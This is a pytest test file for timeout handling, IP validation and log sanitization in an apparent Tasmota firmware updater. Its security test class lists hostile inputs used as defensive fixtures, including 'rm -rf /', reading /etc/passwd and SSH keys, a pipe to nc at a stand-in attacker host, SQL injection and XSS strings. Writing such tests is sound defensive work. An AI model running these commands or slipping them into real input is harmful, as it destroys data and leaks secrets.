"""Edge Cases and Boundary Condition Tests for Timeout Handling

This module tests edge cases and boundary conditions in timeout handling:
- Extreme timeout values and configuration limits
- Network edge cases and unusual error conditions
- Device state edge cases during firmware updates
- Memory and resource boundary conditions
- Security edge cases with malicious inputs
- Race conditions and timing edge cases
"""

import pytest
import time
import threading
from unittest.mock import Mock, patch, MagicMock
from requests.exceptions import (
    ConnectionError, Timeout, RequestException,
    HTTPError, URLRequired, TooManyRedirects
)
import socket
import json

from app.tasmota.updater import (
    TimeoutConfig,
    TimeoutReport,
    TimeoutPhase,
    create_timeout_config,
    verify_device_restart_with_backoff,
    update_device_firmware,
    sanitize_log_data,
    is_valid_ip_address
)


class TestTimeoutBoundaryConditions:
    """Test boundary conditions for timeout values and configurations"""

    def test_minimum_timeout_boundary(self):
        """Test behavior at minimum timeout boundary (30 seconds)"""
        # Test exactly at minimum
        config = TimeoutConfig(total_timeout=30)
        assert config.total_timeout == 30

        # Test just below minimum (should raise error)
        with pytest.raises(ValueError, match="Total timeout must be at least 30 seconds"):
            TimeoutConfig(total_timeout=29)

        # Test edge case: 30.0 seconds (float)
        config_float = TimeoutConfig(total_timeout=30.0)
        assert config_float.total_timeout == 30.0

    def test_maximum_timeout_boundary(self):
        """Test behavior at maximum timeout boundary (600 seconds)"""
        # Test exactly at maximum
        config = TimeoutConfig(total_timeout=600)
        assert config.total_timeout == 600

        # Test just above maximum (should raise error)
        with pytest.raises(ValueError, match="Total timeout cannot exceed 600 seconds"):
            TimeoutConfig(total_timeout=601)

        # Test edge case: 600.0 seconds (float)
        config_float = TimeoutConfig(total_timeout=600.0)
        assert config_float.total_timeout == 600.0

    def test_timeout_config_with_extreme_intervals(self):
        """Test timeout configuration with extreme interval values"""
        # Test very small intervals
        config = TimeoutConfig(
            total_timeout=60,
            min_check_interval=0.1,
            max_check_interval=0.2
        )
        assert config.min_check_interval == 0.1
        assert config.max_check_interval == 0.2

        # Test intervals that equal each other (should fail)
        with pytest.raises(ValueError, match="Min check interval must be less than max check interval"):
            TimeoutConfig(min_check_interval=5.0, max_check_interval=5.0)

        # Test very large intervals
        config_large = TimeoutConfig(
            total_timeout=600,
            min_check_interval=50.0,
            max_check_interval=100.0
        )
        assert config_large.min_check_interval == 50.0
        assert config_large.max_check_interval == 100.0

    def test_device_config_timeout_edge_cases(self):
        """Test device configuration with edge case timeout values"""
        edge_cases = [
            # Boundary values that should be adjusted
            {'input': 10, 'expected_min': 60},    # Too low, adjusted
            {'input': 29, 'expected_min': 60},    # Just below minimum
            {'input': 30, 'expected_min': 60},    # Minimum
            {'input': 700, 'expected_max': 600},  # Too high, capped
            {'input': 1000, 'expected_max': 600}, # Very high, capped
        ]

        for case in edge_cases:
            device_config = {'ip': '192.168.1.100', 'timeout': case['input']}
            config = create_timeout_config(device_config)

            if 'expected_min' in case:
                assert config.total_timeout >= case['expected_min']
            if 'expected_max' in case:
                assert config.total_timeout <= case['expected_max']

    def test_floating_point_timeout_precision(self):
        """Test floating point precision in timeout calculations"""
        # Test with floating point timeout values
        device_config = {'ip': '192.168.1.100', 'timeout': 180.5}
        config = create_timeout_config(device_config)
        assert config.total_timeout == 180.5

        # Test with very precise floating point
        device_config_precise = {'ip': '192.168.1.100', 'timeout': 123.456789}
        config_precise = create_timeout_config(device_config_precise)
        assert config_precise.total_timeout == 123.456789

        # Test timeout report with floating point precision
        report = TimeoutReport(
            total_timeout=180,
            elapsed_time=123.456789,
            phase=TimeoutPhase.RESTART_VERIFICATION,
            attempts=5,
            last_check_interval=2.123456,
            timed_out=False,
            error_type="none",
            details={}
        )

        report_dict = report.to_dict()
        # Should round to 2 decimal places
        assert report_dict['elapsed_time'] == 123.46
        assert report_dict['last_check_interval'] == 2.12


class TestNetworkEdgeCases:
    """Test edge cases in network connectivity and error handling"""

    @patch('app.tasmota.updater.requests.get')
    def test_unusual_http_status_codes(self, mock_requests):
        """Test handling of unusual HTTP status codes"""
        unusual_status_codes = [
            (102, "Processing"),          # Informational
            (226, "IM Used"),            # Success variant
            (418, "I'm a teapot"),       # Client error
            (451, "Unavailable For Legal Reasons"),  # Client error
            (507, "Insufficient Storage"), # Server error
            (511, "Network Authentication Required"), # Server error
        ]

        device_config = {'ip': '192.168.1.100'}
        timeout_config = TimeoutConfig(total_timeout=60)

        for status_code, status_text in unusual_status_codes:
            mock_response = Mock()
            mock_response.status_code = status_code
            mock_requests.return_value = mock_response

            success, report = verify_device_restart_with_backoff(device_config, timeout_config)

            if status_code == 200:
                assert success is True
            else:
                # Non-200 status codes should not be considered success for device verification
                assert success is False

    @patch('app.tasmota.updater.requests.get')
    def test_network_exception_edge_cases(self, mock_requests):
        """Test handling of various network exception types"""
        network_exceptions = [
            ConnectionError("Connection refused"),
            Timeout("Request timeout"),
            HTTPError("HTTP Error"),
            URLRequired("URL Required"),
            TooManyRedirects("Too many redirects"),
            RequestException("Generic request exception"),
            socket.timeout("Socket timeout"),
            socket.gaierror("Name resolution failed"),
            OSError("Network is unreachable"),
        ]

        device_config = {'ip': '192.168.1.100'}
        timeout_config = TimeoutConfig(total_timeout=60)

        for exception in network_exceptions:
            mock_requests.side_effect = exception

            success, report = verify_device_restart_with_backoff(device_config, timeout_config)

            # All network exceptions should result in failure
            assert success is False
            assert report.error_type == "restart_timeout"
            assert report.timed_out is True

    @patch('app.tasmota.updater.requests.get')
    def test_empty_and_malformed_responses(self, mock_requests):
        """Test handling of empty and malformed HTTP responses"""
        response_cases = [
            # Empty response
            Mock(status_code=200, text="", content=b""),
            # Malformed JSON
            Mock(status_code=200, json=Mock(side_effect=ValueError("No JSON"))),
            # Response without expected fields
            Mock(status_code=200, json=Mock(return_value={})),
            # Partial response
            Mock(status_code=200, json=Mock(return_value={"Status": "incomplete"})),
        ]

        device_config = {'ip': '192.168.1.100'}
        timeout_config = TimeoutConfig(total_timeout=60)

        for mock_response in response_cases:
            mock_requests.return_value = mock_response

            success, report = verify_device_restart_with_backoff(device_config, timeout_config)

            # Valid HTTP 200 responses should be considered success for device verification
            # (even if content is malformed, it means device is responding)
            assert success is True

    def test_ip_address_edge_cases(self):
        """Test IP address validation with edge cases"""
        edge_case_ips = [
            # Boundary IP addresses
            ("0.0.0.0", False),          # Network address
            ("255.255.255.255", False),   # Broadcast address
            ("127.0.0.1", False),        # Loopback
            ("169.254.1.1", False),      # Link-local
            ("224.0.0.1", False),        # Multicast
            ("192.0.2.1", True),         # Documentation range (should be private)
            ("10.0.0.1", True),          # Private
            ("172.16.0.1", True),        # Private
            ("192.168.1.1", True),       # Private
            # Edge cases
            ("192.168.1.300", False),    # Invalid octet
            ("192.168.1.-1", False),     # Negative octet
            ("192.168.1", False),        # Incomplete
            ("192.168.1.1.1", False),   # Too many octets
            ("", False),                 # Empty string
            ("not.an.ip", False),        # Non-numeric
        ]

        for ip, expected_valid in edge_case_ips:
            result = is_valid_ip_address(ip)
            assert result == expected_valid, f"IP {ip} validation failed, expected {expected_valid}, got {result}"


class TestDeviceStateEdgeCases:
    """Test edge cases in device state during firmware updates"""

    @patch('app.tasmota.updater.requests.get')
    def test_device_response_during_firmware_flash(self, mock_requests):
        """Test device responses during various firmware update stages"""
        # Simulate device behavior during firmware flashing
        response_sequence = [
            # Initial upgrade command - success
            Mock(status_code=200, json=Mock(return_value={"Status": "Upgrade started"})),
            # Device goes offline during flash
            ConnectionError("Device offline"),
            ConnectionError("Device offline"),
            ConnectionError("Device offline"),
            # Device comes back with bootloader response
            Mock(status_code=503, text="Bootloader"),
            # Device still in recovery
            Timeout("Recovery mode"),
            # Finally back online
            Mock(status_code=200, json=Mock(return_value={"Status": "Ready"})),
        ]

        device_config = {'ip': '192.168.1.100', 'timeout': 120}

        with patch('app.tasmota.updater.build_device_url', return_value="http://192.168.1.100/cm"):
            with patch('app.tasmota.updater.get_device_firmware_version',
                      return_value={'version': '12.0.0'}):
                with patch('app.tasmota.updater.fetch_latest_tasmota_release',
                          return_value={'version': '13.0.0'}):

                    mock_requests.side_effect = response_sequence

                    result = update_device_firmware(device_config)

                    # Should eventually succeed despite complex response sequence
                    assert result['success'] is True
                    assert 'timeout_report' in result

    @patch('app.tasmota.updater.requests.get')
    def test_intermittent_device_connectivity(self, mock_requests):
        """Test handling of intermittent device connectivity"""
        # Simulate intermittent connectivity pattern
        def intermittent_response(*args, **kwargs):
            # Alternating success/failure pattern
            if not hasattr(intermittent_response, 'call_count'):
                intermittent_response.call_count = 0

            intermittent_response.call_count += 1

            if intermittent_response.call_count % 3 == 0:
                return Mock(status_code=200)
            elif intermittent_response.call_count % 3 == 1:
                raise ConnectionError("Intermittent failure")
            else:
                raise Timeout("Intermittent timeout")

        mock_requests.side_effect = intermittent_response

        device_config = {'ip': '192.168.1.100'}
        timeout_config = TimeoutConfig(total_timeout=60)

        success, report = verify_device_restart_with_backoff(device_config, timeout_config)

        # Should eventually succeed with intermittent connectivity
        assert success is True
        assert report.attempts > 1  # Should have made multiple attempts

    def test_rapid_device_state_changes(self):
        """Test handling of rapid device state changes"""
        device_config = {'ip': '192.168.1.100', 'timeout': 60}

        # Simulate rapid state changes with timing
        state_changes = []

        def track_state_change(*args, **kwargs):
            state_changes.append(time.time())
            if len(state_changes) <= 3:
                raise ConnectionError("State changing")
            else:
                return Mock(status_code=200)

        with patch('app.tasmota.updater.requests.get', side_effect=track_state_change):
            timeout_config = TimeoutConfig(total_timeout=60)
            success, report = verify_device_restart_with_backoff(device_config, timeout_config)

        # Should handle rapid state changes
        assert success is True
        assert len(state_changes) >= 4

        # Verify timing of state changes
        if len(state_changes) > 1:
            intervals = [state_changes[i] - state_changes[i-1] for i in range(1, len(state_changes))]
            # All intervals should be reasonable (not too fast, respecting backoff)
            assert all(interval >= 0.001 for interval in intervals)  # At least 1ms apart


class TestSecurityEdgeCases:
    """Test security-related edge cases and input validation"""

    def test_malicious_timeout_values(self):
        """Test handling of malicious timeout values"""
        malicious_values = [
            float('inf'),          # Infinity
            float('-inf'),         # Negative infinity
            float('nan'),          # Not a number
            -1,                    # Negative number
            0,                     # Zero
            2**32,                 # Very large number
            -2**32,                # Very large negative
        ]

        for malicious_value in malicious_values:
            device_config = {'ip': '192.168.1.100', 'timeout': malicious_value}

            try:
                config = create_timeout_config(device_config)
                # If no exception, should use safe default or adjusted value
                assert 60 <= config.total_timeout <= 600
            except (ValueError, TypeError, OverflowError):
                # Expected for invalid input types
                pass

    def test_log_sanitization_edge_cases(self):
        """Test log sanitization with edge cases"""
        sensitive_data_cases = [
            # Various password formats
            'http://user:password123@192.168.1.100',
            'https://admin:secret@device.local',
            '"password": "secret123"',
            "'password': 'secret123'",
            '"password":"secret123"',
            # Nested JSON with passwords
            '{"config": {"password": "secret"}, "data": "normal"}',
            # Multiple passwords
            'user:pass1@host1 and user:pass2@host2',
            # Edge cases
            'password::double:colon',
            'http://user:@host',  # Empty password
            'http://:password@host',  # Empty user
            # Non-English characters
            'http://użytkownik:hasło@device',
            # Special characters in passwords
            'http://user:p@ssw0rd!@#$%@host',
        ]

        for sensitive_data in sensitive_data_cases:
            sanitized = sanitize_log_data(sensitive_data)

            # Should not contain obvious password patterns
            assert 'password123' not in sanitized
            assert 'secret123' not in sanitized
            assert 'secret' not in sanitized or 'secret' in sensitive_data.replace(':', '').replace('"', '')

            # Should contain masking
            if 'password' in sensitive_data.lower():
                assert '********' in sanitized

    def test_injection_attack_prevention(self):
        """Test prevention of injection attacks in timeout parameters"""
        injection_attempts = [
            # Command injection
            '180; rm -rf /',
            '180 && cat /etc/passwd',
            '180 | nc attacker.com 80',
            # SQL injection
            "180'; DROP TABLE devices; --",
            "180 UNION SELECT * FROM users",
            # Script injection
            '<script>alert("xss")</script>',
            'javascript:alert(1)',
            # Path traversal
            '../../etc/passwd',
            '../../../root/.ssh/id_rsa',
            # Format string
            '%x%x%x%x',
            '%s%s%s%s',
        ]

        for injection_attempt in injection_attempts:
            device_config = {'ip': '192.168.1.100', 'timeout': injection_attempt}

            try:
                config = create_timeout_config(device_config)
                # If processing succeeds, should use safe default
                assert isinstance(config.total_timeout, (int, float))
                assert 60 <= config.total_timeout <= 600
            except (ValueError, TypeError):
                # Expected for non-numeric input
                pass

    def test_unicode_and_encoding_edge_cases(self):
        """Test handling of Unicode and encoding edge cases"""
        unicode_cases = [
            # Unicode timeout values (should fail gracefully)
            '１８０',  # Full-width numbers
            '180°',   # Degree symbol
            '180₀',   # Subscript zero
            # Unicode device IPs (should be handled safely)
            '192.168.1.１００',  # Mixed ASCII/Unicode
            # Unicode in error messages
            'Timeout: Błąd sieci',
            'Error: デバイスが見つかりません',
            'Erreur: Délai d\'attente dépassé',
        ]

        for unicode_input in unicode_cases:
            # Test timeout parameter
            device_config = {'ip': '192.168.1.100', 'timeout': unicode_input}

            try:
                config = create_timeout_config(device_config)
                # Should handle gracefully or use default
                assert isinstance(config.total_timeout, (int, float))
            except (ValueError, TypeError, UnicodeError):
                # Expected for invalid Unicode input
                pass

            # Test log sanitization with Unicode
            try:
                sanitized = sanitize_log_data(unicode_input)
                assert isinstance(sanitized, str)
            except UnicodeError:
                # Should not crash on Unicode errors
                pass


class TestRaceConditionsAndTiming:
    """Test race conditions and timing edge cases"""

    def test_concurrent_timeout_modifications(self):
        """Test concurrent modifications to timeout configurations"""
        import threading
        import queue

        results = queue.Queue()
        num_threads = 10

        def modify_timeout_config(thread_id):
            """Modify timeout configuration concurrently"""
            device_config = {
                'ip': '192.168.1.100',
                'timeout': 60 + (thread_id * 10)
            }

            for i in range(100):  # Many operations per thread
                try:
                    config = create_timeout_config(device_config)
                    results.put({
                        'thread_id': thread_id,
                        'iteration': i,
                        'timeout': config.total_timeout,
                        'success': True
                    })
                except Exception as e:
                    results.put({
                        'thread_id': thread_id,
                        'iteration': i,
                        'error': str(e),
                        'success': False
                    })

        # Start concurrent threads
        threads = []
        for thread_id in range(num_threads):
            thread = threading.Thread(target=modify_timeout_config, args=(thread_id,))
            threads.append(thread)
            thread.start()

        # Wait for completion
        for thread in threads:
            thread.join()

        # Collect results
        all_results = []
        while not results.empty():
            all_results.append(results.get())

        # Analyze results
        assert len(all_results) == num_threads * 100

        # All operations should succeed (no race conditions)
        successful = sum(1 for r in all_results if r['success'])
        assert successful == len(all_results)

        # Verify timeout values are correct per thread
        for thread_id in range(num_threads):
            thread_results = [r for r in all_results if r.get('thread_id') == thread_id]
            expected_timeout = 60 + (thread_id * 10)

            for result in thread_results:
                if result['success']:
                    assert result['timeout'] == expected_timeout

    def test_timing_precision_edge_cases(self):
        """Test timing precision in edge cases"""
        device_config = {'ip': '192.168.1.100'}

        # Test very short timeout (at minimum boundary)
        short_config = TimeoutConfig(total_timeout=30)

        start_time = time.time()

        with patch('app.tasmota.updater.requests.get') as mock_get:
            # Simulate operation that takes exactly the timeout duration
            def slow_response(*args, **kwargs):
                time.sleep(30.1)  # Slightly over timeout
                return Mock(status_code=200)

            mock_get.side_effect = slow_response

            success, report = verify_device_restart_with_backoff(device_config, short_config)

        elapsed_time = time.time() - start_time

        # Should timeout approximately at the configured time
        assert success is False
        assert report.timed_out is True
        assert 29 <= elapsed_time <= 35  # Allow some tolerance

    def test_system_clock_changes_during_timeout(self):
        """Test behavior when system clock changes during timeout operations"""
        device_config = {'ip': '192.168.1.100'}
        timeout_config = TimeoutConfig(total_timeout=60)

        # Mock time that jumps backward (simulating clock adjustment)
        time_values = [0, 10, 20, 5, 15, 25, 35, 45]  # Clock jumps back at 4th call

        with patch('app.tasmota.updater.time.time', side_effect=time_values):
            with patch('app.tasmota.updater.requests.get') as mock_get:
                mock_get.side_effect = [
                    ConnectionError("Failed"),
                    ConnectionError("Failed"),
                    ConnectionError("Failed"),
                    Mock(status_code=200)  # Success on 4th attempt
                ]

                success, report = verify_device_restart_with_backoff(device_config, timeout_config)

        # Should handle clock changes gracefully
        # (Implementation should be robust against negative time deltas)
        assert success is True or report.error_type in ['restart_timeout', 'clock_error']


# Test markers for categorization
pytestmark = [
    pytest.mark.edge_cases,
    pytest.mark.boundary,
    pytest.mark.security,
    pytest.mark.stale,  # unmocked network → hangs; pending repair vs current code
]